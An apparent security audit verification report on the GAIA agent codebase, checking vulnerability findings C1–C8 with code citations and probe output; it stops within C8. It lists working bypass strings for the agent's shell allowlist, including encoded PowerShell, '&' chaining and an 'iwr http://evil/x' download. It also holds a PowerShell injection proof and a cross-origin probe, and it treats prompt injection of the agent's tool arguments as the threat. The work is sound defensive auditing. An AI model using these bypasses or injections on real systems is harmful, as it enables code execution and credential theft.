# Adversarial verification — C1…C15 (section 2 of REPORT.md)

Checkout: `C:\Users\14255\Work\gaia\.claudia-worktrees\claudia-task-3369977f` @ detached `211f08c5`.
Python: `.venv\Scripts\python.exe`. Probes written to `%TEMP%\critC\` (outside the tree). Repo untouched.

---

### C1 CONFIRMED-ADJUST

- **Evidence:**
  - `src/gaia/agents/base/agent.py:3157-3184` — `_call_tool_bounded` builds
    `threading.Thread(target=_target, name=f"tool:{tool_name}", daemon=True)` and starts it directly.
    No `contextvars.copy_context()` anywhere in the function. Cited range `3157-3186` is right
    (the def starts at 3157; the body ends at 3184).
  - It is the **only** tool-invocation path: `agent.py:3526` (`result = self._call_tool_bounded(tool, tool_args, tool_name)`)
    inside `_execute_tool` is the sole caller in `src/` (grep: one def, one call).
  - Identity is bound per-turn around `_process_query_impl`, not per-tool: `agent.py:4463`
    `identity_ctx = self._agent_identity_context(ns_id)` / `with identity_ctx:` (4467-4468),
    `_agent_identity_context` at `:4388-4399` returns `_agent_context(ns_id)`.
  - `src/gaia/connectors/api.py:187` `resolved_agent = agent_id if agent_id is not None else current_agent_id()`;
    the docstring at `:182-185` says option 3 is "``None``, which BYPASSES the per-agent grant check";
    `:191-198` skips `check_agent_grant` entirely when `resolved_agent is None`. Cited range exact.
  - `src/gaia/connectors/handler.py:152-155` is the same pattern for MCP-server credentials
    (`resolved_agent = agent_id or current_agent_id()`; gate is `if resolved_agent and required_scopes`).
  - *Probe re-run* (`%TEMP%\critC\p_c1.py`, worktree venv):
    `{'main': 'gaia/probe', 'thread': None, 'copyctx': 'gaia/probe'}` — a bare `threading.Thread`
    sees `None`; a `copy_context().run(...)` thread sees the id. Report's probe reproduces exactly.
  - Documented public pattern is the ungated one: `docs/sdk/infrastructure/connectors.mdx:257-262`
    shows a `@tool` body calling `get_access_token_sync(provider=..., scopes=[...])` with no `agent_id=`.
  - `src/gaia/web/tavily.py:125` `cred = get_credential_sync(_CONNECTOR_ID)` — confirmed at that line.
- **Required edit to REPORT.md:** three corrections, all mechanical.
  1. `connectors/handler.py:401` is a **non-existent line** — the file is 238 lines. Change the
     citation to `connectors/handler.py:152-155`.
  2. `_check_grant_and_scopes` **does not exist** anywhere in `src/`, `hub/` or `tests/` (grep → 0 hits).
     The functions are `connectors/api.py::_authorize_access` and `connectors/handler.py::get_credential`.
     Rewrite the fix clause as: "make `_authorize_access` (`api.py:167`) and `get_credential`
     (`handler.py:133`) fail closed when identity is absent while an agent runtime is active".
  3. The Tavily example is **double-ungated**, and the report attributes it only to the contextvar.
     `handler.py:154` gates on `if resolved_agent and required_scopes:` — `tavily.py:125` passes no
     `required_scopes`, so the Tavily key would be handed out ungated **even with the contextvar intact**.
     Add ", and additionally because `get_credential_sync` is called with no `required_scopes`, which
     skips the grant check independently of C1".
  Also sharpen the fix so it is implementable: the copy must be taken in the *caller* thread —
  "`ctx = contextvars.copy_context()` before `Thread(...)`, and `target=lambda: ctx.run(_target)`".
  Taking `copy_context()` inside `_target` would be a no-op fix.
- **Severity check:** keep 🔴. Security control documented as active (#915 per-agent grants) is
  inert on the only code path that matters. Attacker position is correctly *not* claimed to be
  remote: the report states in-tree callers pass `agent_id=` explicitly, so today's exposure is a
  latent one for third-party/skill-authored tools following the documented pattern. That framing is honest.
- **Fix check:** `copy_context().run()` works (probe `copyctx` line). One caveat the report should
  keep in mind but need not state: `get_credential_sync`'s docstring (`handler.py:189-190`) already
  claims "Contextvar propagation is preserved via `copy_context()` at submit time" — true, but it
  copies the *tool thread's* already-empty context, so that existing mitigation does not save this path.
  The "fail closed when an agent runtime is active" half needs a runtime-active signal that does not
  itself live in a contextvar, or it inherits the same blind spot.
- **Tracked check:** none found. `gh issue list -R amd/gaia --search "contextvar agent_id grant"` and
  `"current_agent_id thread"` → only #915 and #927, both CLOSED feature issues, neither this defect.

---

### C2 CONFIRMED

- **Evidence:**
  - `hub/agents/chat/python/gaia_agent_chat/agent.py:1642` `@tool`, `:1643` `def notify_desktop(...)`,
    `:1665-1668` builds `ps_cmd = f"Add-Type …; [System.Windows.Forms.MessageBox]::Show('{message}', '{title}')"`,
    `:1669-1678` `subprocess.Popen(["powershell","-WindowStyle","Hidden","-Command", ps_cmd], …DEVNULL)`.
    Cited range `1643-1701` is exact (the `except Exception` tail is at `:1699-1701`).
  - `plyer` is declared **nowhere**: `grep -rn plyer --include=*.toml --include=*.txt --include=setup.py .` → 0 hits;
    the worktree venv confirms `plyer installed: False`. So `except ImportError` is the live path.
  - `notify_desktop` is **not** in `TOOLS_REQUIRING_CONFIRMATION` (`src/gaia/agents/base/agent.py:198-211`,
    which lists only shell/file-mutation tools).
  - Profile claim is right: `agent.py:1289-1297` — the `"chat"` profile takes `spec.early_return` and
    registers only shell tools; every other profile falls through. `notify_desktop` is in the `desktop`
    bundle for both `doc` and `full` (`tool_bundles.py:137` and `:367`).
  - *Probe re-run.* f-string render (`%TEMP%\critC\p_c2.py`) reproduces the report's output exactly:
    `…::Show('hi'); Write-Host INJECTED; ('x', 't')`.
    I went one step further and confirmed PowerShell **actually executes** the injected statement
    (`%TEMP%\critC\c2.ps1`, with `Show` swapped for `[System.Console]::Write` to avoid a blocking modal):
    `parse errors: 0` then `hiINJECTED_PROOF` / `x` / `t`. The injected `Write-Host` ran as its own statement.
  - Note the argv is a *list*, so this is not a `cmd.exe` injection — it is a PowerShell-parser
    injection inside the single `-Command` argument. The report does not claim otherwise.
- **Required edit to REPORT.md:** none required. Optional precision: `notify_desktop` lives in the
  loadable `desktop` bundle rather than `*_CORE_TOOLS`, so the model must load that bundle first —
  worth one clause ("(via the loadable `desktop` bundle)") but it is model-driven, not a consent gate,
  so it does not change the finding.
- **Severity check:** keep 🔴. Arbitrary code execution as the user, no confirmation, window hidden and
  both streams to `DEVNULL` so it is silent. Attacker position: prompt-injected content (a fetched page,
  an indexed document, an issue body) steering the model's tool args — correctly stated in source 01.
- **Fix check:** the proposed fix is right, and the ordering matters — argument-passing is the real fix;
  a confirmation gate alone would not be (a hidden PowerShell window is not something a user can
  evaluate from a prompt). One precision: `-Command "& {param($m,$t) …}" -m … -t …` does **not** bind
  reliably through `powershell.exe -Command`. The shapes that work are `-EncodedCommand` over a
  UTF-16LE script whose literals are escaped (`'` → `''`), or dropping PowerShell entirely for
  `ctypes.windll.user32.MessageBoxW`. Recommend the report say that rather than the ambiguous
  "pass strings as arguments to a fixed script block".
- **Tracked check:** none found (`gh issue list -R amd/gaia --search "notify_desktop"` and
  `--search "powershell injection"` → nothing).

---

### C3 CONFIRMED-ADJUST

- **Evidence:**
  - `src/gaia/skills/install.py:487` `def remove_skill(...)`, `:500` `target = root / name`,
    `:519` `shutil.rmtree(target)`. No name validation between them. Cited range `487-529` is right.
  - `install_skill`: `:187` `target = destination_root / name`, `:271` `shutil.rmtree(target)`,
    `:273` `shutil.copytree(source_dir, target)`. `name` comes from `parse_skill_ref` (`:91-113`),
    which only splits on `@` and strips — no charset check.
  - `src/gaia/agents/tools/skill_library_tools.py:108-131` `_reject_bad_name` and `:41`
    ("is a substrate flaw reported upstream") — confirmed verbatim, and it **is** wired in
    (`:381`), so the model-facing path is already safe.
    `format.py:50` `NAME_PATTERN = re.compile(r"^[a-z0-9]+(-[a-z0-9]+)*$")` confirmed.
  - *Probe re-run* (`%TEMP%\critC\p_c3.py`, temp fake `~/.gaia`, `SkillManager(user_skills_root=…)`):
    `remove_skill(".")` → log `Removed skill '.' from …\.gaia\skills`; afterwards the tree is
    `['fakehome\.gaia\config.json']` — `keys/signing.key` and `skills.lock` gone,
    `skills root exists: False`. `remove_skill("..")` → `gaia_home exists: False config.json exists: False`.
    Both reproduce.
- **Required edit to REPORT.md:** one **wrong file path** and two off-by-ones.
  1. "`gaia skill import --name … --force` (`cli.py:587-604`)" points at the wrong file —
     `src/gaia/cli.py:587-604` is the `gaia chat` device-resolution block. The real code is
     **`src/gaia/skills/cli.py:580-598`** (`_handle_import`: `:588` `target = destination_root / name`,
     `:596` `shutil.rmtree(target)` under `--force`, `:598` `copytree`).
  2. `:186-187` → `:187`; the `rmtree` in `install_skill` is `:271`, not `270-273`.
  3. Add that the wrapper is wired in, so the **model-driven** path is not exploitable. As written a
     reader could infer the agent can trigger this.
- **Severity check:** keep 🔴 on the data-loss axis (`REVIEW.md`: "data-loss risk"), but the report must
  say plainly that **this is a CLI footgun, not a reachable attack**: the only callers are human-typed
  `gaia skill remove <name>` / `gaia skill import --name`, and the model-facing wrapper already rejects.
  Add "Attacker position: none — a mistyped or copy-pasted name by the user." Without that line, 🔴 in a
  security-heavy section reads as remotely reachable, which it is not.
- **Fix check:** correct and cheap. The `target.resolve().parent == root.resolve()` assert is the
  load-bearing half (it catches symlink and `\\?\` shapes `NAME_PATTERN` never sees); keep both. One gap
  in the fix list: `_handle_import` must validate `args.name` **and** the fallback `skill.name`, which
  comes from the imported bundle's own `SKILL.md` — i.e. remote-supplied. The report's
  "remove/install/import/migrate" list does not call out that second source.
- **Tracked check:** none found (`--search "skill remove rmtree"`, `--search "skill name traversal"` → nothing).

---

### C4 CONFIRMED-ADJUST (one sub-claim REFUTED, one OVERSTATED)

Every listed bypass string was re-run through `_validate_shell_command` at HEAD
(`%TEMP%\critC\p_c4.py`, `p_c4b.py`). Verbatim results:

```
ALLOWED    | 'dir . &where cmd'
refused    | 'dir . &&where cmd'
refused    | 'dir . & where cmd'
refused    | 'dir >& out.txt'          <- caught by &(?=\s|$), not by the > rule
ALLOWED    | 'dir >&2'   'dir . >&2'   'dir >&out.txt'   'dir 2>&1'
refused    | 'dir <&0'                 <- '<&' does NOT slip
ALLOWED    | 'powershell -e SQBFAFgA'      'powershell -ec SQBFAFgA'
refused    | 'powershell -enc …'           'powershell -EncodedCommand …'
ALLOWED    | 'powershell -Command "Get-Content x > C:\out.txt"'
ALLOWED    | 'powershell -Command "[System.Diagnostics.Process]::Start(''calc'')"'
ALLOWED    | 'powershell -Command "[System.IO.File]::WriteAllText(''C:\out.txt'',''x'')"'
ALLOWED    | 'powershell -Command "sc"'  '"ri C:\x"'  '"saps calc"'  '"iwr http://evil/x"'
ALLOWED    | 'powershell -Command "(Get-WmiObject -List Win32_Process).Create(''calc.exe'')"'
ALLOWED    | 'powershell -Command "& calc.exe"'   'powershell -Command "&$var"'
```

- **Evidence:**
  - `shell_tools.py:192-194` — the `DANGEROUS_SHELL_OPERATORS` regex, with the `&(?=\s|$)` lookahead
    the report describes. Report cites `:192-203`; `:196-203` is the unrelated
    `_POLICY_GATED_SHELL_TOOL` comment.
  - `:949` `use_shell = os.name == "nt" and not lone_granted_segment`; `:958` `exec_cmd = command`
    (the **raw original string**); `:1029` `shell=use_shell`. The report's `:949-958, :1029` is exact.
  - `_operator_check_text` (`:223-246`) strips the `-Command`/`-c` body before the operator scan —
    that is why `> C:\out.txt` inside `-Command` is invisible to the operator blocklist.
  - `_BLOCKED_PS_FLAGS` (`:596-610`) contains `-encodedcommand` and `-enc` but **not** `-e`/`-ec`.
    *Live confirmation, beyond the validator:* `powershell -e <b64>` and `powershell -ec <b64>` both
    executed `Write-Host EPROOF` on this machine.
  - The cmdlet check is `re.findall(r"[a-z]+-[a-z]+", ps_cmd)` (`:641`) — one-word aliases and
    `[Type]::Method(...)` are not tokens it looks at. `DANGEROUS_PS_PATTERNS` (`:148-181`) is substring
    matching on `set-`/`remove-`/… plus `"& {"`, `"& '"`, `'& "'`, so bare `& calc.exe` and `&$var`
    miss all three.
  - *Execution proof for the `&` case:* `subprocess.run("dir . &where cmd", shell=True, …)` → `rc=0`,
    stdout tail `['… 2 Dir(s) …', 'C:\Windows\System32\cmd.exe']` — the second command ran.
  - Auto-approve knobs exist as claimed: `console.py:67 AUTO_APPROVE_ENV_VAR = "GAIA_AUTO_APPROVE_TOOLS"`,
    `:202 auto_approve_gated_tools: bool = False`, `:420` OR of the two.
- **Required edit to REPORT.md:**
  1. **REFUTE the `<&` half.** `dir <&0` is **refused** — `<(?:[^<]|$)` matches `<&`. Change
     "`>&`/`<&` slip" to "`>&` slips".
  2. **Downgrade the `>&` claim to a validator gap with no payload.** `dir >&out.txt` clears the
     validator, but `cmd /c "dir . >&out.txt"` errors with `>& was unexpected at this time.` and writes
     nothing — `>&` is handle duplication in cmd.exe, not file redirection — and on POSIX `use_shell`
     is False so nothing is interpreted at all. Reword to "`>&` slips the regex (no cmd.exe payload
     today, but it breaks the stated invariant)". Listing it as an exploit is C4's one overstatement.
  3. `:192-203` → `:192-194`.
  4. Say explicitly that `-enc` / `-EncodedCommand` **are** already blocked, so a reader does not
     "fix" it by re-adding a flag that is there. The bug is PowerShell's prefix matching, and the fix
     is "reject any prefix of `EncodedCommand`/`ExecutionPolicy`/`File`" — which the report's fix
     clause already says; just make the already-blocked part explicit.
  5. The report writes `[Diagnostics.Process]::Start(...)`; the fully-qualified
     `[System.Diagnostics.Process]::Start('calc')` also passes. No edit needed — noting the
     verification is broader than the report's string.
  Every other listed bypass reproduces exactly.
- **Severity check:** keep 🔴 after the two corrections. `powershell -e <base64>` alone is unrestricted
  code execution through a tool the agent advertises as a read-only allowlist, and the `&`-chaining and
  `[Type]::` cases each independently break the boundary. But state the gate honestly and *earlier*:
  `run_shell_command` **is** in `TOOLS_REQUIRING_CONFIRMATION`, so on a TTY the user sees the raw command
  string and must approve. The report says this only in its last sentence — move it forward, because for
  a default interactive user what fails here is the *allowlist's claim*, not consent.
- **Fix check:** the argv-execution fix is correct but far larger than the bullet implies —
  `exec_cmd = command` exists precisely to preserve quoting for the PowerShell/pipe paths (`:952-953`
  comment), and the `_UNIX_TO_WIN` remap (`:960-975`) is string surgery on that same string. Recommend
  the report split it: (a) treat every `&` as an operator and add `-e`/`-ec` prefix matching — two
  small changes that close the two *executable* holes today; (b) the argv rewrite as a follow-up.
- **Tracked check:** **#2768 is a closer match than #2785.** #2768 (OPEN, `bug`) —
  "Audit `ALLOWED_COMMANDS` for remaining write/exec side-doors" — asks for exactly a "systematic sweep:
  for each entry in `ALLOWED_COMMANDS`, ask whether any flag or subcommand makes it write, delete, or
  execute", naming `wmic` and `git -c` as suspects. That umbrella covers the PowerShell alias / `[Type]::`
  half of C4, not the `&`-operator / raw-string-to-`cmd.exe` half. Change "Tracked: none (#2785 adjacent)"
  to "Tracked: #2768 covers the allowlist-side-door half; the `&`-operator and raw-string-to-`cmd.exe`
  half is untracked (#2785 is docs-only)." Also worth one clause: #2947 (CLOSED) fixed this same class in
  `run_cli_command`, so C4 is a **recurrence**, which strengthens it.

---

### C5 CONFIRMED

- **Evidence:**
  - `src/gaia/skills/binaries.py:414-415` — `# `status` only. `gh auth token` prints the credential.` /
    `"auth": _gh({"status"}),`. Cited lines exact. `_gh` (`:364-383`): with an empty *confirm* set it
    returns `Subcommand(actions=…, value_flags=_GH_COMMON_VALUE_FLAGS)` — **no `denied_flags` at all**,
    because the write denylist is only attached when there are confirm actions (`:377-383`).
  - `shell_tools.py:377-395` `skill_grant_covers_call` docstring: "**The ALLOW tier only.**" — an ALLOW
    verdict is exactly what skips the per-call confirmation modal.
  - *Probe re-run* (`%TEMP%\critC\p_c5.py`, `classify_invocation(BINARY_POLICIES["gh"], …)`):
    ```
    gh auth status                                      allowed=True
    gh auth status --show-token                         allowed=True
    gh auth status -t                                   allowed=True
    gh auth status --show-token --hostname github.com   allowed=True
    gh auth token                                       allowed=False  ('gh auth token' is not allowed…)
    gh auth login                                       allowed=False
    gh repo view --web                                  allowed=True
    gh run view --web / gh run list --watch             allowed=True
    gh pr checks --watch                                allowed=True
    ```
    Reproduces the report exactly, and confirms the two extra flags the report's fix names
    (`--web`, `--watch`) are also in ALLOW.
  - The flag is real on the installed CLI: `gh auth status --help` (gh 2.83.1) →
    `-t, --show-token   Display the auth token`. `run_shell_command` captures stderr
    (`capture_output=True`, `shell_tools.py:1002`), which is where `gh auth status` writes, so the
    token lands in the tool result the model reads. I did **not** execute it — printing a live PAT
    into a transcript is the thing this finding is about.
- **Required edit to REPORT.md:** none. One optional strengthening: the *reason* the denylist is
  absent is structural, not an oversight — `_gh` attaches `denied_flags` only to subcommands that
  declare confirm actions (`binaries.py:373-383`), so **every** purely-read subcommand
  (`repo`, `release`, `run`, `search`, `auth`) has an empty denylist. Saying that turns a one-flag
  patch into the right fix (`--web` / `--watch` land the same way).
- **Severity check:** keep 🔴. Credential disclosure to the model's context, with **no prompt**, via a
  grant the user gave for read-only triage. Attacker position: any loaded skill declaring
  `shell:execute:gh`, or prompt-injected text inside content such a skill already reads (an issue
  body). Correctly stated.
- **Fix check:** `denied_flags={"-t","--show-token"}` alone is **not sufficient as written** —
  `_gh({"status"})` takes the no-confirm branch, which constructs a `Subcommand` without a
  `denied_flags` kwarg at all, so the fix must either give `_gh` a `denied` parameter for the
  read-only branch or hoist the denylist out of the confirm branch. Say that, otherwise the fix reads
  as a one-line dict edit that the current `_gh` shape cannot take. The report's alternative
  ("allow-list flags for read-only subcommands as the `pytest` policy does") is the more robust
  option and is the one I'd lead with — the `-t`/`--web`/`--watch` triple is evidence that a denylist
  will keep leaking.
- **Tracked check:** none found (`--search "gh auth show-token"` → 0; `--search "skill binary grant gh auth"`
  → only #3329, unrelated).

---

### C6 CONFIRMED

- **Evidence:**
  - `src/gaia/skills/install.py:210-216` — `bundle = download_artifact(name, version, artifact,
    workdir / artifact.filename, …)`. The destination is a bare join of the temp workdir with a
    manifest-supplied string. Cited `:210-217` — right.
  - `src/gaia/skills/hub.py:276-282` — `RemoteArtifact(filename=str(raw["filename"]), …)`. The only
    check above it (`:265-273`) is *presence* of `filename` and `sha256`, never their shape. Exact.
  - `src/gaia/skills/hub.py:412-414` — `destination = Path(destination); destination.parent.mkdir(
    parents=True, exist_ok=True); destination.write_bytes(payload)`. Exact.
  - Ordering claim is right: the write is at `install.py:210`; `_unpack_bundle` is `:218`,
    `fetch_skill_doc`/`parse_skill`/`validate_skill` `:221-225`, and the tier / signature /
    `allow_experimental` / dangerous-grant gates are at `:262-271` — all *after* the bytes are on disk.
  - The SHA-256 does not help because the attacker supplies both halves of the manifest — and the
    check (`hub.py:402-410`) runs *before* the write, so a matching hash guarantees the write happens.
  - *Probe re-run* (`%TEMP%\critC\p_c6.py`, fake fetcher, fake workdir):
    ```
    filename='../outside-marker.zip'    -> WROTE …\c6probe-…\outside-marker.zip   inside workdir? False
    filename='../../way-outside.zip'    -> WROTE C:\…\Temp\way-outside.zip        inside workdir? False
    filename='<absolute .zip path>'     -> WROTE that absolute path              inside workdir? False
    ```
    Both traversal and absolute-path forms reproduce.
  - The report's proposed fix has a live model: `workers/agent-hub/src/skill-publish.ts:109-117`
    rejects `!ARTIFACT_FILENAME_RE.test(filename)` with `invalid_artifact` and the message
    "Use a single path segment of letters, digits, '.', '_', '+', '-'". The client simply does not
    mirror it.
- **Required edit to REPORT.md:** add the **attacker position**, which the current wording leaves
  ambiguous. Because the Worker enforces `ARTIFACT_FILENAME_RE` at publish, a normal publisher
  cannot set a hostile filename. The realistic vectors are (1) a compromised hub origin / R2 bucket,
  (2) `GAIA_HUB_URL` pointed at an attacker origin (`src/gaia/hub/catalog.py:72-73` honours it),
  (3) TLS interception — and (3) is a high bar against `https://hub.amd-gaia.ai`. Suggested clause:
  "Requires a hostile hub origin (a compromised bucket, or `GAIA_HUB_URL` pointed elsewhere); the
  Worker's own publish-time `ARTIFACT_FILENAME_RE` means an ordinary publisher cannot do this."
  Then "MITM'd" should be dropped or qualified.
- **Severity check:** keep 🔴, on defense-in-depth grounds that are strong here rather than weak: the
  signature / tier / experimental gates exist **specifically** for a hostile-hub threat model, the
  zip-*entry* traversal check is implemented and tested, and this is the one path in that same flow
  where hub-controlled data reaches the filesystem before any of it runs. A boundary with one
  unguarded door is the definition of a 🔴 security finding.
- **Fix check:** correct, and the second option ("always download to `workdir/"bundle.zip"`") is the
  better one — it removes the attacker's influence entirely rather than filtering it, and nothing
  downstream depends on the artifact's on-disk name (`_unpack_bundle` takes the `bundle` path and an
  explicit `workdir / "unpacked"` output). Recommend the report lead with that variant.
  Note also that `skill_artifact_url` (`hub.py:78-82`) interpolates the same unvalidated filename
  into the request URL, so a validated filename fixes a second (smaller) problem for free.
- **Tracked check:** none found (`--search "artifact filename traversal"` → 0).

---

### C7 CONFIRMED (all six sub-claims verified individually; two citations wrong, one example wrong)

I verified (a)–(f) separately. **All six mechanisms are real.** Two line citations are wrong and one
worked example does not work as written.

**The framing is stronger than the report claims, and this should be said.** The sandbox is not
opt-in: `PathValidator.__init__` (`src/gaia/security.py:248-255`) falls back to
`Path.cwd().resolve()` when `allowed_paths` is None, and `ChatAgent.__init__`
(`hub/agents/chat/python/gaia_agent_chat/agent.py:253-256`) does the same. So **every** ChatAgent /
GaiaAgent runs with a live sandbox (CWD by default), and every tool below reads or writes outside it
on a default install — not only when a user passes `--allowed-paths`. Add that sentence; it converts
C7 from "the opt-in sandbox leaks" to "the always-on sandbox leaks".

The doc claims the report leans on are real:
`docs/sdk/sdks/rag.mdx:994` ("Without `allowed_paths`, RAG can index any file the process can read.
In production, always set explicit allowed paths."), `docs/playbooks/chat-agent/part-3-deployment.mdx:512`
("Set `allowed_paths` in production. Prevents path traversal and unauthorized access."),
`docs/reference/cli.mdx:782` ("security sandbox"), and `docs/releases/v0.23.0.mdx:339`
(`fix(security): enforce --allowed-paths sandbox on file read tools (#2344)`).

**(a) `find_files(scope=<path>)` — CONFIRMED.** `filesystem_tools.py:694` `search_roots =
_get_search_roots(scope)`; `_get_search_roots` (`:1120-1156`) ends `else: return [scope]` — any string
is accepted as a root, and `scope="everywhere"` (`:1129-1138`) enumerates every drive letter. The
mixin never calls its own `_validate_path` here: that helper (`:64-70`) is called at `:144, :275,
:397, :797, :1012, :1037` and nowhere in `find_files`. The docstring claim is at `:52`
("All path parameters are validated through PathValidator before access") — exact.
The pinning test is at `tests/unit/test_filesystem_tools_mixin.py:656 test_scope_specific_path` —
line exact. *Small wording correction:* that test asserts an arbitrary directory works as a scope; it
does not assert a sandbox bypass. "pins the bypass" → "pins arbitrary-path scope as intended
behaviour, so fixing (a) breaks it".

**(b) `index_directory` — CONFIRMED.** `rag_tools.py:1954 def index_directory`; the only two
`_is_path_allowed` calls in the file are `:576-577` (`query_specific_file`'s auto-index) and
`:1259-1260` (`index_document`). `index_directory` resolves `dir_path` (`:1969`), globs, and calls
`self.rag.index_document(str(file_path))` per file with no check. *Citation edit:* `:1969-2016` is
inside the body; use `:1954` (def) or `:1954-2016`.

**(c) RAG SDK extractors — CONFIRMED, and stronger than stated.** All four cited lines are exact:
`rag/sdk.py:722 reader = PdfReader(pdf_path)`, `:1012 prs = Presentation(pptx_path)`,
`:1601 wb = openpyxl.load_workbook(xlsx_path, data_only=True)`, `:1737 doc = Document(docx_path)` —
each hands a raw path to a library instead of going through `_safe_open` (`:256-300`, which *does*
call `path_validator.is_path_allowed` at `:272-274`). `_get_cache_path:452-457` is exact:
`except (OSError, IOError)` swallows the `PermissionError` `_safe_open` raises (it is an `OSError`
subclass) and returns a `…_notfound.json` cache key instead of failing.
The `hasattr(self, "_is_path_allowed")` guards are real (`rag_tools.py:577`, `:1259`) and
`_is_path_allowed` is defined in exactly **one** place repo-wide —
`hub/agents/chat/python/gaia_agent_chat/agent.py:1161` (grep over `src/` + `hub/`, one hit) —
so the report's "only `ChatAgent` defines it" is right.
**Stronger than the report says:** `RAGSDK.index_document` itself (`rag/sdk.py:2552`) contains **no**
`path_validator` / `is_path_allowed` call anywhere in its body — its first path touch is
`_get_cache_path` (`:2688`), the call that swallows the denial. So the SDK entry point the report
proposes to fix is not merely inconsistent, it is entirely unguarded.
*Probe re-run* (`%TEMP%\critC\p_c7c.py`, `allowed_paths=[<allowed>]`, files in `<outside>`):
```
is_path_allowed(outside txt/pdf): False
_safe_open(outside .txt)   -> PermissionError: Access denied: …\outside\secret.txt is not in allowed paths
_get_cache_path(outside .txt) -> …\cache\89c3…_notfound.json        <- denial swallowed
_extract_text_from_pdf(outside .pdf) -> EmptyPDFError: "The file has 1 page(s) but none contained
                                        machine-readable text."     <- file WAS opened and paged
```
Exactly the report's "PDF outside `allowed_paths` → pages opened (`pdf_status=empty`), TXT → Access denied".

**(d) VLM mixin — CONFIRMED.** `src/gaia/vlm/mixin.py` contains **zero** occurrences of
`path_validator` / `PathValidator` / `is_path_allowed` / `_validate` (grep → 0). `_analyze_image`
does `path = Path(image_path)` (`:139`) then `image_bytes = path.read_bytes()` (`:159`);
`_answer_question_about_image` the same at `:193` / `:202`. Both cited ranges exact. Worth one clause
the report omits: the bytes are sent to a VLM whose *description* comes back in the tool result, so
this is a read **and an exfiltration channel** for any file on disk, not just a sandbox escape.

**(e) Listing tools — CONFIRMED.** `ChatAgent.list_files` at
`gaia_agent_chat/agent.py:1359-1393` is `items = os.listdir(path)` with no validator (cited
`:1359-1395`; the tool body ends at `:1393`). In `file_tools.py` the sandbox helper
`_read_access_error` (`:64-82`) is called at exactly four sites — `:590` (`read_file`), `:807`
(`search_file_content`), `:1667` (`get_file_info`), `:1888/1894/1909` (`analyze_data_file`) — and at
none inside `search_file` (`:120-465`, incl. the all-drives `deep_search` at `:372-381`),
`search_directory` (`:486-561`), `browse_directory` (`:1468-1638`) or `list_recent_files`
(`:2573-…`). Verified by scanning each range for `_read_access_error|is_path_allowed|path_validator`
→ zero hits in all four.

**(f) Writers — CONFIRMED mechanism, WRONG citation, WRONG example.**
- `dump_document`: `rag_tools.py:1828 def dump_document`; `:1886 output_path = str(Path(output_path).resolve())`;
  `:1902-1910 os.makedirs(...)`; `:1912-1913 open(output_path, "w") … f.write(...)`. No
  `validate_write` / `is_path_allowed` anywhere in `:1828-1950` (grep → 0). Cited `:1885-1913` is the
  write block — acceptable, but naming the def (`:1828`) is clearer.
- `take_screenshot`: **the cited `screenshot_tools.py:779-808` does not exist — the file is 96 lines.**
  The real code is `:29-39` (the `@tool` wrapper) and `:41-56` (`_take_screenshot`:
  `out = Path(output_path)` at `:50`, `out.parent.mkdir(parents=True, exist_ok=True)` at `:51`,
  then `mss.tools.to_png(..., output=str(out))` at `:61` or `img.save(str(out), "PNG")` at `:79`).
  The file contains **no** `is_path_allowed` / `validate_write` / `path_validator` / `is_write_blocked`
  (grep → 0). **This citation must be fixed.**
- Neither tool is in `TOOLS_REQUIRING_CONFIRMATION` (`agent.py:198-211`) — confirmed.
- **The worked example is wrong.** `dump_document("x.pdf", output_path="~/.ssh/authorized_keys")` does
  **not** reach the user's home: `Path("~/.ssh/authorized_keys").resolve()` performs no `expanduser`,
  so it resolves under the process CWD as a literal `~` directory. The mechanism holds for an
  *absolute* path. Replace the example with an absolute one (e.g.
  `output_path="C:\\Users\\<user>\\.ssh\\authorized_keys"`), or the first reader who tries it will
  conclude the finding is false. Same correction applies to any `~`-based screenshot example.
- One honest limit worth a clause: `take_screenshot` writes **PNG bytes**, so its overwrite is
  destructive rather than a content-injection primitive; `dump_document` writes attacker-influenced
  markdown and is the stronger of the two.

- **Severity check:** keep 🔴. Six independent holes in a boundary that is on by default and that
  three separate docs call a production security control. Attacker position: prompt-injected content
  steering the model's tool arguments — no confirmation is asked for any of the six.
- **Fix check:** the single-`FileAccessPolicy` fix is the right shape, with two cautions.
  (1) "replace the `hasattr` guards with a registration-time check that fails loudly" will break every
  agent that composes `RAGToolsMixin` without a validator — which is the documented pattern and is
  the very population the report says is unprotected. Sequence it: attach a default
  `PathValidator([Path.cwd()])` at mixin registration (matching `PathValidator`'s own default), *then*
  make the missing-validator case fail loudly. (2) `_get_cache_path`'s `except (OSError, IOError)`
  must be narrowed to re-raise `PermissionError` in the same change, or `RAGSDK.index_document` will
  keep degrading a denial into a cache miss — that is a Fail-Loudly violation in its own right and
  deserves its own sentence in the fix.
  Fixing (a) requires updating `tests/unit/test_filesystem_tools_mixin.py:656`, which the report
  already flags ("fix the pinning test") — good.
- **Tracked check:** #3316 (OPEN, "tool mixins require host attributes nothing sets, failing only at
  first tool call") confirmed — it is about the `hasattr`/missing-host-attribute class generally and
  references #3312. The report's "covers only the `hasattr` inconsistency" is accurate. Nothing found
  for the other five (`--search "allowed_paths bypass"`, `"index_directory path validation"`,
  `"PathValidator RAG sandbox"` → 0).

---

### C8 CONFIRMED-ADJUST (the `AgentServer` half is worse than stated; the `openai_server` CORS half is REFUTED)

- **Evidence:**
  - `src/gaia/agents/base/server.py:440-446` — `app.add_middleware(CORSMiddleware, allow_origins=["*"],
    allow_credentials=True, allow_methods=["*"], allow_headers=["*"])`. Report cites `:441-448`;
    the block is `:440-446`.
  - **Worse than "wildcard CORS".** *Probe* (`%TEMP%\critC\p_c8.py`, Starlette `TestClient` against the
    identical middleware config — no port bound):
    ```
    OPTIONS /v1/chat/completions  Origin: http://evil.example -> 200
        access-control-allow-origin      = http://evil.example
        access-control-allow-credentials = true
    POST    /v1/chat/completions  Origin: http://evil.example -> 200  {"ok":true}
        access-control-allow-origin      = http://evil.example
        access-control-allow-credentials = true
    ```
    Starlette **reflects the requesting Origin** rather than emitting a literal `*`, so the browser
    does *not* reject it — a hostile page can both drive the agent **and read the response**. The
    report's own framing ("wildcard CORS") understates this; so does #2951's note that
    "browsers reject [it] outright for credentialed requests". Say "reflects any Origin with
    credentials, so the reply is readable cross-origin (verified)".
  - No auth of any kind on the app: grep for `Depends|Authorization|token|auth` in
    `agents/base/server.py` returns only unrelated prose and `*_tokens` counters.
  - `POST /v1/<id>/init` really can pull: `:595-625` `agent_provision()` streams a model download.
    Report's `:565-620` is a shade early (the mount block starts `:577`); use `:577-625`.
  - Bind: `run_api(self, host="localhost", port=8000)` at **`:664`**, `uvicorn.run(app, host=host,
    port=port)` at `:673`, argparse defaults at `:720-725`. Report's `:733-736` is **wrong** —
    that range is inside `run_agent_cli`'s docstring.
